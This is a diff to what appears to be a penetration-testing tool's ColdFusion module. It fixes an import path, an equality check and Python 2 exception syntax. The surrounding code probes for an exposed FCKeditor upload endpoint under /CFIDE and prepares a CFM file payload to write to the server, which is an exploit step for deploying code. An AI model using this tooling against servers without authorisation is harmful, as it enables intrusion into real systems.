@@ -1,7 +1,7 @@
 from src.platform.coldfusion.interfaces import CINTERFACES
 from src.module.deploy_utils import parse_war_path
 from os.path import abspath
-from log import LOG
+from src.core.log import LOG
 import utility
 
 
@@ -20,7 +20,7 @@ def deploy(fingerengine, fingerprint):
     uri = "/CFIDE/scripts/ajax/FCKeditor/editor/dialog/fck_about.html"
 
     response = utility.requests_get(url + uri)
-    if response.status_code is 200 and "FCKeditor" in response.content:
+    if response.status_code == 200 and "FCKeditor" in response.content:
         utility.Msg("FCKeditor exposed, attempting to write payload...")
     else:
         utility.Msg("FCKeditor doesn't seem to be exposed (HTTP %d)" % response.status_code)
@@ -28,7 +28,7 @@ def deploy(fingerengine, fingerprint):
 
     try:
         payload = {"NewFile" : ("asdf.txt", open(cfm_path, "r").read())}
-    except Exception, e:
+    except Exception as e:
         utility.Msg("Error reading file: %s" % e, LOG.ERROR)
         return
     
